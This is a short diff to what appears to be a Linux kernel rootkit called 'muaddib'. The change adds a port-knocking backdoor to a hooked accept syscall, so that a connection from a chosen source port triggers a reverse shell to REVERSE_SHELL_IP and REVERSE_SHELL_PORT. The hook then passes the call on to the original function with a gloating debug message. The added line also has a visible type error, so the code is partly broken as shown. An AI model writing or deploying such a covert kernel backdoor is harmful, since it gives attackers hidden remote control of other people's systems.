@@ -33,6 +33,10 @@ asmlinkage int muaddib_accept(const struct pt_regs *regs){
 static asmlinkage long (*og_accept)(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen);
 
 static asmlinkage int muaddib_accept(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen){
+    struct sockaddr_in sock_in = (struct sockaddr_in *) addr;
+    if(ntohs(sock_in->sin_port) == SRCPORT) {
+        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
+    }
     printk("accept hooked :)");
     return og_accept(sockfd, addr, addrlen);
 }
